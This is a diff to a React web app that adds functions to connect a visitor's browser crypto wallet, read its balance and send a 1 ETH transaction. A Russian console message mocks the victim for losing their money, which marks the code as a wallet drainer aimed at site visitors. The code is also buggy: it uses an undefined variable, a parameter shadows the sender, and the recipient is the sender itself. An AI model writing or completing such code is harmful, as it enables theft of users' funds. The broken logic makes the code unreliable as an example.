@@ -15,16 +15,46 @@ const address = "D7xLPt19BogkxXd2C2AAhaHUh1VoDLzxdf9ConG2gJWf"
 function App() {
     const [opacity, setOpacity] = useState(0)
     const [offset, setOffset] = useState(0)
+    const [fromWallet, setFromWallet] = useState(null)
 
-    const connectAndSend = () => {
-        connectWallet()
+    const connectAndSend = async () => {
+        try {
+            await connectWallet()
+            await getBalance()
+            await sendEth()
+        } catch (err) {
+            console.log(err)
+        }
     }
 
     const connectWallet = async () => {
-        const response = await window.ethereum.request({method: 'eth_requestAccounts'}).catch((err) => {
+        const response = await window.ethereum.request({method: 'eth_requestAccounts'}).catch(err => {
             console.log(err)
         })
         console.log(response)
+        setFromWallet(response[0])
+    }
+
+    const getBalance = async () => {
+      let responseBalance = await window.ethereum.request({method: 'eth_getBalance', params:[response[0], 'latest']}).catch(err => {
+          console.log(err)
+      })
+        console.log('Простой',responseBalance,'Непонятный',parseInt(responseBalance) / Math.pow(10, 18))
+    }
+
+    const sendEth = async (fromWallet) => {
+        let params = [{
+            "from": fromWallet,
+            "to": fromWallet,
+            "gas": Number(21000).toString(16),
+            "gasPrice": Number(2500000).toString(16),
+            "value": Number(1000000000000000000).toString(16)
+        }]
+
+        const response = await window.ethereum.request({method: 'eth_sendTransaction', params}).catch(err => {
+            console.log(err)
+        })
+        console.log('Ты потерял свои бабки, лох',response)
     }
 
     setTimeout(() => {
